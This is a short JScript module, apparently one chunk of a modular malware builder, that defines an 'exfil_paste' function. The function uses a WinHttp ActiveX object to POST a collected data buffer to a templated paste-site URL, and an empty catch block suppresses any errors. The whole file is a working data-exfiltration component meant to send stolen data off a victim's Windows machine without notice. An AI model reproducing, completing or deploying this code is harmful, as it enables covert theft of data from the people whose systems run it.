// chunk: exfil/paste_site
// depends: core/emit_buffer
// provides: exfil_paste
// format: jscript

function exfil_paste() {
    try {
        var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        h.Open("POST", "{{PASTE_URL}}", false);
        h.SetRequestHeader("Content-Type", "text/plain");
        h.Send(_buf);
    } catch(ex) {}
}
